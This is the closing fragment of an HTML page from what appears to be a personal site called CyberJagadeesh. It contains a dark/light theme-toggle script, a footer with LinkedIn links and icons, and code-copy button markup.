    themeToggle.addEventListener('change', function () {
      if (this.checked) {
        theme = dark;
      } else {
        theme = light;
      }
      sendMessage({
        setConfig: {
          theme: theme,
        }
      });
    });
  })();
</script>
  


      

    </div>
  </div>
</div>

  </main>
  <footer class="flex flex-none justify-center">
    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
  <div class="flex flex-row">
    
  
  
  
  
  
  
  
  
    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-27598134b" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
      <span class="hidden">LinkedIn</span>
      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
   <path d="M8 11l0 5"></path>
   <path d="M8 8l0 .01"></path>
   <path d="M12 16l0 -5"></path>
   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
</svg>
 </i>
    </a>
  
  
  
    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
      <span class="hidden">LinkedIn</span>
      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
   <path d="M8 11l0 5"></path>
   <path d="M8 8l0 .01"></path>
   <path d="M12 16l0 -5"></path>
   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
</svg>
 </i>
    </a>
  
  
  
  


  </div>
  <div class="grow"></div>
  <div class="flex flex-row">
    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
</svg>
</i> 2024 - 2025 CyberJagadeesh
    
  </div>
  
</section>

  </footer>
  <script src="/main.js"></script>

<div class="hidden top-1 right-1" id="code-copy">
  <i class="h-6 w-6 block">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
</svg>

  </i>
</div>
<div class="hidden top-1 right-1" id="code-copy-done">
  <i class="h-6 w-6 block">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M5 12l5 5l10 -10" />
</svg>

  </i>
</div><script src="/code-copy.js"></script>





</body>
</html>
